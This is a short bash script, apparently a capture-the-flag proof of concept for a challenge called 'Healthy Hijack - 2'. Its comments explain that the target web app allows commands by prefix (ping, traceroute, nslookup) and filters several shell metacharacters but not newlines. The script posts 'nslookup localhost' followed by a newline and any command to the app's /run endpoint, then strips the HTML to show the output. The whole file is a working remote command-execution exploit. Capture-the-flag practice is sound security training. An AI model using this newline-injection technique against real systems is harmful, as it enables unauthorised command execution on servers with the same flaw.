#!/usr/bin/env bash
# Healthy Hijack - 2  |  RCE helper
# Same newline-injection as challenge 1: the app whitelists by command prefix
# (ping|traceroute|nslookup) and strips ; & | ` $( and < but NOT "\n", while
# running with subprocess.run(shell=True).
#
# Usage:  ./poc_rce.sh 'id'
set -u
TARGET="https://kicyber-9c272408f0ca-healthyhijack-0-0.chals.io"

rexec() {
    local c="$1"
    curl -sk --max-time 60 -X POST "$TARGET/run" \
        --data-urlencode "cmd=nslookup localhost
$c" \
    | sed -n '/#0f0/,/<\/div>/p' \
    | sed 's/<[^>]*>//g' \
    | sed '1,/::1/d'
}

rexec "$1"